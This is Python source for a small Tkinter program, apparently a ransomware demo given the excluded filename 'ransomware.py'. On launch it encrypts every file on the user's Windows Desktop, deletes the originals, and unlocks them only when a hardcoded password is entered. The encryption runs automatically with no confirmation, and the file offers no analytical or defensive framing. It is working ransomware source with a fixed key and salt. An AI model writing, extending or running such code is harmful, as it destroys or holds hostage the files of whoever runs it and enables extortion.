from tkinter import messagebox, simpledialog, Tk, Button
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.fernet import Fernet
import base64
import os

SALT = b"TbhukHlLofdlONlslJwpqmdImwL"
PASSWORD = "TbhukHlLofdlONlslJwpqmdImwL"

def derive_key(password):
    try:
        kdf = Scrypt(salt=SALT, length=32, n=2**14, r=8, p=1)
        return base64.urlsafe_b64encode(kdf.derive(password.encode()))
    except Exception as e:
        print(f"Error deriving key: {e}")
        raise

KEY = derive_key(PASSWORD)

def validate_password(input_password):
    try:
        return derive_key(input_password) == KEY
    except Exception as e:
        print(f"Validation error: {e}")
        return False

def encrypt_directory(directory, key):
    try:
        f = Fernet(key)
        for root, _, files in os.walk(directory):
            for file in files:
                if file.lower() in ["desktop.ini", "ransomware.py"] or file.endswith(".enc"):
                    print(f"Skipping: {file}")
                    continue

                filepath = os.path.join(root, file)
                encrypted_filepath = filepath + ".enc"

                try:
                    with open(filepath, "rb") as file_obj:
                        data = file_obj.read()
                    encrypted_data = f.encrypt(data)
                    with open(encrypted_filepath, "wb") as enc_file:
                        enc_file.write(encrypted_data)

                    os.remove(filepath)
                    print(f"Encrypted: {filepath}")
                except Exception as e:
                    print(f"Failed to encrypt {filepath}: {e}")

        messagebox.showinfo("Success", "All files encrypted successfully!")
    except Exception as e:
        messagebox.showerror("Error", f"Encryption failed: {e}")

def decrypt_directory(directory, key):
    try:
        entered_password = simpledialog.askstring(
            "Password Required", "Enter the decryption password:", show="*"
        )
        
        if not entered_password or not validate_password(entered_password):
            messagebox.showerror("Error", "Incorrect password. Decryption aborted.")
            return
        
        f = Fernet(key)
        log_file_path = os.path.join(directory, "decryption_log.txt")
        with open(log_file_path, "w") as log_file:
            for root, _, files in os.walk(directory):
                for file in files:
                    if not file.endswith(".enc"):
                        continue
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, "rb") as file_obj:
                            encrypted_data = file_obj.read()

                        decrypted_data = f.decrypt(encrypted_data)
                        decrypted_filepath = filepath.rsplit(".enc", 1)[0]
                        
                        with open(decrypted_filepath, "wb") as file_obj:
                            file_obj.write(decrypted_data)
                        
                        log_file.write(f"Decrypted: {decrypted_filepath}\n")
                        os.remove(filepath)
                        print(f"Successfully decrypted and removed: {filepath}")
                    except Exception as e:
                        log_file.write(f"Failed to decrypt {filepath}: {e}\n")
                        print(f"Failed to decrypt {filepath}: {e}")
        
        messagebox.showinfo("Success", f"Decryption completed successfully! Log file: {log_file_path}")
    except Exception as e:
        messagebox.showerror("Error", f"Decryption failed: {e}")

def encrypt_desktop():
    desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")
    encrypt_directory(desktop_path, KEY)

def decrypt_desktop():
    desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")
    decrypt_directory(desktop_path, KEY)

if __name__ == "__main__":
    print("Starting File Encryptor/Decryptor...")

    root = Tk()
    root.title("File Encryptor/Decryptor")
    root.geometry("300x150")

    decrypt_button = Button(root, text="Decrypt All in Desktop", command=decrypt_desktop)
    decrypt_button.pack(pady=10)

    encrypt_desktop()

    root.mainloop()